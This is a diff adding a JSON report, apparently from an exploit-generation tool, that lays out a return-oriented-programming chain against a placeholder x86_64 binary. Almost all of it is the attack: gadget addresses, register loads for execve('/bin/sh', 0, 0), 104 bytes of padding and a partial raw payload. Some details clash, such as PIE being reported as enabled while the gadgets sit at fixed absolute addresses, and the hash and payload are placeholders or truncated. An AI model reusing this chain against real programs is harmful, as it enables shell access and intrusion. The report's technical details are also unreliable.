@@ -1,0 +1,101 @@
+{
+  "report_id": "ROPW-20250926-001A",
+  "report_date": "2025-09-26T11:00:00Z",
+  "tool_version": "ROPWeaver_v1.2.3",
+  "target_binary": {
+    "filename": "/path/to/vulnerable_app",
+    "sha256": "a1b2c3d4e5f67890...",
+    "size_bytes": 124560
+  },
+  "binary_analysis": {
+    "architecture": "x86_64",
+    "endianness": "little",
+    "base_address": "0x400000",
+    "hardening_features": {
+      "nx_enabled": true,
+      "pie_enabled": true,
+      "relro_full": false
+    },
+    "text_section": {
+      "start_address": "0x401000",
+      "size_bytes": 10000
+    },
+    "data_string_info": {
+      "bin_sh_address": "0x4020a8",
+      "string_found": true
+    }
+  },
+  "gadget_summary": {
+    "total_found": 452,
+    "categorization_notes": "Resolved x86_64/ARM64 register labeling issue.",
+    "categorized_counts": {
+      "pop_rdi": 12,
+      "pop_rsi": 8,
+      "pop_rdx": 5,
+      "syscall": 3,
+      "stack_pivot": 2
+    }
+  },
+  "rop_chain_generation": {
+    "status": "Success (Execve-Shell)",
+    "target_syscall": "execve",
+    "chain_builder_logic": "Standard_Syscall_Setup",
+    "chain_notes": "Successfully found all necessary pop gadgets (rdi, rsi, rdx, rax)."
+  },
+  "rop_chain_details": {
+    "arch_bit_size": 64,
+    "chain_length_steps": 5,
+    "padding_size": 104,
+    "chain_steps": [
+      {
+        "index": 1,
+        "type": "Register_Load",
+        "gadget_address": "0x4014d0",
+        "assembly": "pop rdi ; ret",
+        "value_loaded": "0x4020a8",
+        "register": "rdi",
+        "comment": "Load '/bin/sh' address into RDI"
+      },
+      {
+        "index": 2,
+        "type": "Register_Load",
+        "gadget_address": "0x4015c3",
+        "assembly": "pop rsi ; ret",
+        "value_loaded": "0x00000000",
+        "register": "rsi",
+        "comment": "Load 0 into RSI (argv)"
+      },
+      {
+        "index": 3,
+        "type": "Register_Load",
+        "gadget_address": "0x40161a",
+        "assembly": "pop rdx ; ret",
+        "value_loaded": "0x00000000",
+        "register": "rdx",
+        "comment": "Load 0 into RDX (envp)"
+      },
+      {
+        "index": 4,
+        "type": "Register_Load",
+        "gadget_address": "0x401188",
+        "assembly": "pop rax ; ret",
+        "value_loaded": "0x3b",
+        "register": "rax",
+        "comment": "Load Syscall number 59 (0x3B) into RAX"
+      },
+      {
+        "index": 5,
+        "type": "Syscall_Execution",
+        "gadget_address": "0x4011f0",
+        "assembly": "syscall",
+        "value_loaded": "N/A",
+        "register": "N/A",
+        "comment": "Execute execve(\"/bin/sh\", 0, 0)"
+      }
+    ]
+  },
+  "raw_payload": {
+    "format": "python_hex_string",
+    "data": "A"*104 + "\\xd0\\x14\\x40\\x00..."
+  }
+}
